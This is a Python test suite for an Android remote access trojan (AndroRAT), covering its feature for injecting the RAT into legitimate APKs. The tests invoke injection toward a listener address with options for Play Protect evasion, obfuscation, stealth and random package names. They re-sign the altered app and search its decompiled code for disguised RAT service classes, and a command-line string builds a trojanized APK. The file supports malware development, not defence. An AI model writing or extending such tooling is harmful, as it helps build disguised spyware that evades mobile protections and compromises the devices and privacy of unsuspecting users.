#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
APK Injection Testing Suite
Tests the new APK injection functionality for AndroRAT
"""

import sys
import os
import tempfile
import shutil
import subprocess
import time

# Add the server directory to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'server'))

from utils import *

def create_test_apk():
    """Create a simple test APK for injection testing"""
    print(stdOutput("info") + "Using existing AndroRAT APK for testing...")
    
    # Use the existing AndroRAT APK as our test target
    existing_apk = "Android_Code/app/release/app-release.apk"
    
    if os.path.exists(existing_apk):
        # Copy it to temp location for testing
        test_apk_path = "/tmp/test_target_app.apk"
        shutil.copy2(existing_apk, test_apk_path)
        print(stdOutput("success") + f"Test APK prepared: {test_apk_path}")
        return test_apk_path
    else:
        # Try to build a simple APK using the existing infrastructure
        print(stdOutput("info") + "Building simple test APK...")
        try:
            # Create a temporary simple APK using our existing build system
            temp_output = "/tmp/simple_test_app.apk"
            # Use our existing build system to create a basic APK
            result = build_with_evasion("127.0.0.1", "8080", temp_output, False, None, None, {})
            
            if os.path.exists(temp_output):
                print(stdOutput("success") + f"Test APK created: {temp_output}")
                return temp_output
            else:
                print(stdOutput("error") + "Failed to create test APK using build system")
                return None
                
        except Exception as e:
            print(stdOutput("error") + f"Test APK creation failed: {str(e)}")
            return None


def test_apk_info_extraction():
    """Test APK information extraction"""
    print(stdOutput("info") + "Testing APK info extraction...")
    
    test_apk = create_test_apk()
    if not test_apk:
        return False
    
    try:
        info = extract_apk_info(test_apk)
        if info:
            print(stdOutput("success") + f"Extracted info: {info['package_name']} - {info['app_label']}")
            return True
        else:
            print(stdOutput("error") + "Failed to extract APK info")
            return False
    except Exception as e:
        print(stdOutput("error") + f"APK info extraction test failed: {str(e)}")
        return False
    finally:
        if os.path.exists(test_apk):
            os.remove(test_apk)


def test_injection_functionality():
    """Test complete APK injection functionality"""
    print(stdOutput("info") + "Testing complete APK injection...")
    
    test_apk = create_test_apk()
    if not test_apk:
        return False
    
    try:
        # Test injection with different evasion options
        evasion_options = {
            'stealth': True,
            'random_package': True,
            'anti_analysis': False,
            'play_protect_evasion': True,
            'advanced_obfuscation': True,
            'fake_certificates': False
        }
        
        output_apk = "/tmp/injected_test_app.apk"
        
        # Perform injection
        success = inject_rat_into_apk(
            test_apk, 
            "192.168.1.100", 
            "8080", 
            output_apk, 
            evasion_options
        )
        
        if success and os.path.exists(output_apk):
            print(stdOutput("success") + "APK injection successful!")
            
            # Basic validation - check if output APK is valid
            if validate_injected_apk(output_apk):
                print(stdOutput("success") + "Injected APK validation passed!")
                return True
            else:
                print(stdOutput("error") + "Injected APK validation failed!")
                return False
        else:
            print(stdOutput("error") + "APK injection failed!")
            return False
            
    except Exception as e:
        print(stdOutput("error") + f"Injection test failed: {str(e)}")
        return False
    finally:
        # Cleanup
        for path in [test_apk, output_apk]:
            if os.path.exists(path):
                os.remove(path)


def validate_injected_apk(apk_path):
    """Validate that the injected APK is properly formed"""
    try:
        # Use aapt to dump basic info (if available) or apktool
        cmd = f"java -jar Jar_utils/apktool.jar d {apk_path} -o /tmp/validation_check -f"
        result = execute(cmd)
        
        if result.returncode == 0:
            # Check if essential files exist
            validation_dir = "/tmp/validation_check"
            essential_files = [
                "AndroidManifest.xml",
                "apktool.yml"
            ]
            
            for file in essential_files:
                if not os.path.exists(os.path.join(validation_dir, file)):
                    return False
            
            # Check if RAT components were injected
            smali_dir = os.path.join(validation_dir, "smali")
            if os.path.exists(smali_dir):
                # Look for injected RAT classes
                for root, dirs, files in os.walk(smali_dir):
                    for file in files:
                        if file.endswith('.smali'):
                            file_path = os.path.join(root, file)
                            with open(file_path, 'r') as f:
                                content = f.read()
                                # Look for RAT-related content
                                if any(term in content for term in ['DeviceManagerService', 'SystemBootReceiver', 'network_service']):
                                    print(stdOutput("success") + f"Found injected RAT component: {file}")
                                    
            # Cleanup validation directory
            shutil.rmtree(validation_dir, ignore_errors=True)
            return True
        else:
            return False
            
    except Exception as e:
        print(stdOutput("warning") + f"APK validation error: {str(e)}")
        return False


def test_signature_handling():
    """Test APK signature handling and preservation"""
    print(stdOutput("info") + "Testing APK signature handling...")
    
    try:
        # Create test APKs
        test_apk = create_test_apk()
        if not test_apk:
            return False
        
        # Sign the test APK first
        signed_test_apk = "/tmp/signed_test_app.apk"
        cmd = f"java -jar Jar_utils/sign.jar -a {test_apk} -o {signed_test_apk} --overwrite"
        result = execute(cmd)
        
        if result.returncode != 0:
            print(stdOutput("error") + "Failed to sign test APK")
            return False
        
        # Test signature preservation
        output_apk = "/tmp/signature_test_injected.apk"
        
        # Simple test - just call the signing function
        success = sign_injected_apk(signed_test_apk, output_apk, signed_test_apk)
        
        if success and os.path.exists(output_apk):
            print(stdOutput("success") + "Signature handling test passed!")
            return True
        else:
            print(stdOutput("error") + "Signature handling test failed!")
            return False
            
    except Exception as e:
        print(stdOutput("error") + f"Signature test failed: {str(e)}")
        return False
    finally:
        # Cleanup
        for path in [test_apk, signed_test_apk, output_apk]:
            if os.path.exists(path):
                os.remove(path)


def test_cli_integration():
    """Test CLI integration for injection functionality"""
    print(stdOutput("info") + "Testing CLI integration...")
    
    try:
        # Create test APK
        test_apk = create_test_apk()
        if not test_apk:
            return False
        
        # Test CLI command
        output_apk = "/tmp/cli_injection_test.apk"
        cmd = f"python3 server/androRAT.py --build --inject --target-apk {test_apk} -i 192.168.1.100 -p 8080 -o {output_apk} --stealth --random-package"
        
        # Since we can't easily test the full CLI in this context, 
        # just verify the parsing would work
        import argparse
        parser = argparse.ArgumentParser()
        parser.add_argument('--build', action='store_true')
        parser.add_argument('--inject', action='store_true')
        parser.add_argument('--target-apk', type=str)
        parser.add_argument('-i', '--ip', type=str)
        parser.add_argument('-p', '--port', type=str)
        parser.add_argument('-o', '--output', type=str)
        parser.add_argument('--stealth', action='store_true')
        parser.add_argument('--random-package', action='store_true')
        
        test_args = [
            '--build', '--inject', '--target-apk', test_apk,
            '-i', '192.168.1.100', '-p', '8080', '-o', output_apk,
            '--stealth', '--random-package'
        ]
        
        args = parser.parse_args(test_args)
        
        if args.inject and args.target_apk and args.ip and args.port and args.output:
            print(stdOutput("success") + "CLI argument parsing test passed!")
            return True
        else:
            print(stdOutput("error") + "CLI argument parsing test failed!")
            return False
            
    except Exception as e:
        print(stdOutput("error") + f"CLI integration test failed: {str(e)}")
        return False
    finally:
        if os.path.exists(test_apk):
            os.remove(test_apk)


def run_all_injection_tests():
    """Run all APK injection tests"""
    print(stdOutput("info") + "\033[1m=== APK Injection Test Suite ===")
    
    tests = [
        ("APK Info Extraction", test_apk_info_extraction),
        ("Signature Handling", test_signature_handling),
        ("CLI Integration", test_cli_integration),
        ("Complete Injection", test_injection_functionality)  # Run this last as it's most comprehensive
    ]
    
    passed = 0
    total = len(tests)
    
    for test_name, test_func in tests:
        print(f"\n{stdOutput('info')}Running {test_name} test...")
        try:
            if test_func():
                print(stdOutput("success") + f"{test_name} test PASSED!")
                passed += 1
            else:
                print(stdOutput("error") + f"{test_name} test FAILED!")
        except Exception as e:
            print(stdOutput("error") + f"{test_name} test ERROR: {str(e)}")
    
    print(f"\n{stdOutput('info')}\033[1m=== Test Results ===")
    print(f"{stdOutput('info')}Tests passed: {passed}/{total}")
    
    if passed == total:
        print(stdOutput("success") + "\033[1m🎉 All APK injection tests PASSED!")
        return True
    else:
        print(stdOutput("error") + f"\033[1m❌ {total - passed} tests FAILED!")
        return False


if __name__ == "__main__":
    # Change to repository root
    os.chdir('/home/runner/work/AndroRAT/AndroRAT')
    
    # Run tests
    success = run_all_injection_tests()
    sys.exit(0 if success else 1)